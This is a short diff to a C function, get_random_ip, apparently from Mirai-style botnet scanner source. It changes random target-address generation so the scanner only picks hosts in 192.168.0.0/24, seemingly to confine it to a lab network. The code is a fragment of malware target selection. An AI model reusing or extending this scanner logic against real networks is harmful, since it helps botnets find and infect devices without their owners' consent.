@@ -680,9 +680,9 @@ static ipv4_t get_random_ip(void)
     {
         tmp = rand_next();
 
-        o1 = tmp & 0xff;
-        o2 = (tmp >> 8) & 0xff;
-        o3 = (tmp >> 16) & 0xff;
+        o1 = 192;
+        o2 = 168;
+        o3 = 0;
         o4 = (tmp >> 24) & 0xff;
     }
     while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
@@ -691,7 +691,7 @@ static ipv4_t get_random_ip(void)
           (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
           (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
           (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
-          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
+          (o1 != 192 && o2 != 168) ||               // 192.168.0.0/16   - Internal network
           (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
           (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
           (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
